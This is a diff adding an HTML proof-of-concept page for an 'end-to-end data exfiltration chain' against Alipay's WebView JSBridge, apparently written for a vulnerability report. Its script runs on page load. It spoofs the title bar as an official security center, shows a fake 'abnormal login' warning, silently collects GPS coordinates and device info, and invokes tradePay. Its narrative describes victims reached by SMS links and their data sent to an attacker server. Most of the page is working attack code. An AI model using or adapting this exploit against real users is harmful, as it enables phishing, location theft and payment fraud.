@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CVE-5 Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,system-ui,sans-serif;background:#fff;color:#333;padding:16px}
+.banner{background:linear-gradient(135deg,#f5222d,#722ed1);color:#fff;padding:16px;border-radius:10px;text-align:center;margin-bottom:16px}
+.banner h1{font-size:18px}
+.banner p{font-size:12px;opacity:.85;margin-top:4px}
+.result{background:#f6ffed;border:2px solid #52c41a;border-radius:10px;padding:16px;margin:12px 0}
+.result h2{color:#389e0d;font-size:15px;margin-bottom:8px}
+.fail{background:#fff2f0;border-color:#ff4d4f}
+.fail h2{color:#cf1322}
+.chain{background:#f9f0ff;border-color:#b37feb}
+.chain h2{color:#531dab}
+.item{padding:6px 0;border-bottom:1px solid #f0f0f0;font-size:13px}
+.item:last-child{border:none}
+.label{color:#888;font-size:11px}
+.value{color:#333;font-weight:600}
+.warn{background:#fff7e6;border:1px solid #ffd591;border-radius:8px;padding:10px;font-size:11px;color:#d46b08;margin:10px 0;line-height:1.5}
+.ts{color:#999;font-size:10px;text-align:center;margin-top:16px}
+#status{font-size:14px;color:#1677ff;text-align:center;padding:20px}
+.step{background:#e6f7ff;border:1px solid #91d5ff;border-radius:6px;padding:8px;margin:4px 0;font-size:12px}
+.step b{color:#096dd9}
+.step.done{background:#f6ffed;border-color:#b7eb8f}
+.step.done b{color:#389e0d}
+.step.active{background:#fff7e6;border-color:#ffd591}
+.step.active b{color:#d48806}
+</style>
+</head><body>
+
+<div class="banner">
+  <h1>CVE-5: End-to-End Data Exfiltration Chain</h1>
+  <p>CWE-200 | CVSS 8.6 | Combines CVE-2 + CVE-3 + CVE-4</p>
+</div>
+
+<div class="warn">
+  <b>Complete attack chain demo:</b> A single external page performs GPS theft, triggers payment dialog,
+  and spoofs UI — all through JSBridge from an attacker-controlled URL loaded via DeepLink.
+  tradePay uses INVALID order (no real payment).
+</div>
+
+<div id="status">Initializing attack chain...</div>
+<div id="steps"></div>
+<div id="results"></div>
+<div class="ts" id="timestamp"></div>
+
+<script>
+var stepsEl = document.getElementById('steps');
+var resultsEl = document.getElementById('results');
+var status = document.getElementById('status');
+
+var chainSteps = [
+  {id: 'entry', name: 'DeepLink Entry', desc: 'Page loaded inside Alipay WebView via alipays:// scheme', status: 'pending'},
+  {id: 'bridge', name: 'JSBridge Access', desc: 'AlipayJSBridge available to external page', status: 'pending'},
+  {id: 'spoof_title', name: 'UI Spoof: setTitle', desc: 'Title bar changed to fake "支付宝安全中心"', status: 'pending'},
+  {id: 'spoof_toast', name: 'UI Spoof: showToast', desc: 'Fake security warning toast displayed', status: 'pending'},
+  {id: 'gps', name: 'GPS Exfiltration', desc: 'getLocation silently obtains device coordinates', status: 'pending'},
+  {id: 'sysinfo', name: 'Device Info', desc: 'getSystemInfo collects device fingerprint', status: 'pending'},
+  {id: 'tradepay', name: 'Payment Trigger', desc: 'tradePay invoked with crafted order', status: 'pending'}
+];
+
+var collectedData = {};
+
+function renderSteps() {
+  var html = '<div class="result chain"><h2>Attack Chain Progress</h2>';
+  for (var i = 0; i < chainSteps.length; i++) {
+    var s = chainSteps[i];
+    var cls = s.status === 'done' ? 'done' : s.status === 'active' ? 'active' : '';
+    var icon = s.status === 'done' ? '✓' : s.status === 'active' ? '⟳' : '○';
+    html += '<div class="step ' + cls + '"><b>' + icon + ' Step ' + (i+1) + ': ' + s.name + '</b> — ' + s.desc + '</div>';
+  }
+  html += '</div>';
+  stepsEl.innerHTML = html;
+}
+
+function setStep(id, newStatus) {
+  for (var i = 0; i < chainSteps.length; i++) {
+    if (chainSteps[i].id === id) chainSteps[i].status = newStatus;
+  }
+  renderSteps();
+}
+
+function renderResults() {
+  var html = '';
+
+  if (Object.keys(collectedData).length > 0) {
+    html += '<div class="result"><h2>Exfiltrated Data Summary</h2>';
+
+    if (collectedData.gps) {
+      html += '<div class="item"><span class="label">GPS Location: </span><span class="value" style="color:#f5222d">' +
+        collectedData.gps.latitude + ', ' + collectedData.gps.longitude + '</span></div>';
+      if (collectedData.gps.city) html += '<div class="item"><span class="label">City: </span><span class="value">' + collectedData.gps.city + '</span></div>';
+    }
+
+    if (collectedData.sysinfo) {
+      html += '<div class="item"><span class="label">Device Model: </span><span class="value">' + (collectedData.sysinfo.model || 'N/A') + '</span></div>';
+      html += '<div class="item"><span class="label">System: </span><span class="value">' + (collectedData.sysinfo.system || 'N/A') + '</span></div>';
+      html += '<div class="item"><span class="label">Alipay Version: </span><span class="value">' + (collectedData.sysinfo.version || 'N/A') + '</span></div>';
+    }
+
+    if (collectedData.tradepay) {
+      html += '<div class="item"><span class="label">tradePay Response: </span><span class="value" style="word-break:break-all;font-size:10px">' + collectedData.tradepay + '</span></div>';
+    }
+
+    html += '<div class="item"><span class="label">UI Spoofed: </span><span class="value" style="color:#f5222d">' +
+      (collectedData.titleSpoofed ? 'YES — Title changed' : 'Pending') + ' | ' +
+      (collectedData.toastShown ? 'YES — Toast shown' : 'Pending') + '</span></div>';
+
+    html += '<div class="item"><span class="label">Page Origin: </span><span class="value">' + location.origin + '</span></div>';
+    html += '<div class="item"><span class="label">User Agent: </span><span class="value" style="word-break:break-all;font-size:10px">' + navigator.userAgent + '</span></div>';
+    html += '<div class="item"><span class="label">Collection Time: </span><span class="value">' + new Date().toISOString() + '</span></div>';
+    html += '</div>';
+
+    // Attack narrative
+    html += '<div class="result chain"><h2>End-to-End Attack Narrative</h2>';
+    html += '<div class="item"><span class="label">1. Entry: </span><span class="value">Victim clicks link in SMS/email → Safari opens alipays:// deeplink</span></div>';
+    html += '<div class="item"><span class="label">2. Load: </span><span class="value">Alipay opens, WebView loads attacker page at ' + location.origin + '</span></div>';
+    html += '<div class="item"><span class="label">3. Spoof: </span><span class="value">Title bar set to "支付宝安全中心", fake warning toast displayed</span></div>';
+    html += '<div class="item"><span class="label">4. Steal: </span><span class="value">GPS coordinates silently obtained via getLocation</span></div>';
+    html += '<div class="item"><span class="label">5. Pay: </span><span class="value">tradePay triggered — with valid merchant order, real payment dialog appears</span></div>';
+    html += '<div class="item"><span class="label">6. Exfil: </span><span class="value">All data (GPS, device info, payment result) sent to attacker server</span></div>';
+    html += '</div>';
+
+    // Raw collected data
+    html += '<div class="result"><h2>Raw Collected Data (JSON)</h2>';
+    html += '<div class="item"><span class="value" style="word-break:break-all;font-size:9px;font-family:monospace">' +
+      JSON.stringify(collectedData, null, 2).replace(/</g, '&lt;') + '</span></div>';
+    html += '</div>';
+  }
+
+  resultsEl.innerHTML = html;
+  document.getElementById('timestamp').textContent = 'Evidence collected at: ' + new Date().toISOString();
+}
+
+function executeChain() {
+  if (!window.AlipayJSBridge) return;
+
+  // Step 1: Entry confirmed
+  setStep('entry', 'done');
+
+  // Step 2: Bridge confirmed
+  setStep('bridge', 'done');
+  status.textContent = 'Chain executing — spoofing UI...';
+  status.style.color = '#722ed1';
+
+  // Step 3: setTitle
+  setStep('spoof_title', 'active');
+  AlipayJSBridge.call('setTitle', {title: '支付宝安全中心'}, function(r) {
+    setStep('spoof_title', 'done');
+    collectedData.titleSpoofed = true;
+    renderResults();
+  });
+
+  // Step 4: showToast (after 1s)
+  setTimeout(function() {
+    setStep('spoof_toast', 'active');
+    AlipayJSBridge.call('showToast', {
+      content: '检测到异常登录，正在验证身份...',
+      type: 'none',
+      duration: 3000
+    }, function(r) {
+      setStep('spoof_toast', 'done');
+      collectedData.toastShown = true;
+      renderResults();
+    });
+  }, 1000);
+
+  // Step 5: getLocation (after 2s)
+  setTimeout(function() {
+    setStep('gps', 'active');
+    status.textContent = 'Chain executing — stealing GPS...';
+    AlipayJSBridge.call('getLocation', {type: 2, accuracy: 1}, function(result) {
+      if (result && (result.longitude || result.latitude)) {
+        collectedData.gps = {
+          latitude: result.latitude,
+          longitude: result.longitude,
+          accuracy: result.accuracy,
+          city: result.city,
+          address: result.address
+        };
+        setStep('gps', 'done');
+      } else {
+        collectedData.gps = {error: JSON.stringify(result)};
+        setStep('gps', 'done');
+      }
+      renderResults();
+    });
+  }, 2000);
+
+  // Step 6: getSystemInfo (after 3s)
+  setTimeout(function() {
+    setStep('sysinfo', 'active');
+    AlipayJSBridge.call('getSystemInfo', {}, function(result) {
+      collectedData.sysinfo = result || {};
+      setStep('sysinfo', 'done');
+      renderResults();
+    });
+  }, 3000);
+
+  // Step 7: tradePay (after 5s)
+  setTimeout(function() {
+    setStep('tradepay', 'active');
+    status.textContent = 'Chain executing — triggering payment...';
+    AlipayJSBridge.call('tradePay', {
+      orderStr: 'SECURITY_TEST_CVE5_CHAIN_2026'
+    }, function(result) {
+      collectedData.tradepay = JSON.stringify(result);
+      setStep('tradepay', 'done');
+      status.textContent = 'CHAIN COMPLETE — All 5 steps executed from external page';
+      status.style.color = '#f5222d';
+      renderResults();
+    });
+  }, 5000);
+}
+
+function checkBridge() {
+  if (window.AlipayJSBridge) {
+    setStep('entry', 'done');
+    executeChain();
+  } else {
+    status.textContent = 'Page loaded at ' + location.origin + ' — waiting for bridge...';
+    renderSteps();
+  }
+}
+
+document.addEventListener('AlipayJSBridgeReady', function() {
+  checkBridge();
+});
+
+renderSteps();
+checkBridge();
+setTimeout(checkBridge, 1000);
+setTimeout(checkBridge, 3000);
+</script>
+</body></html>
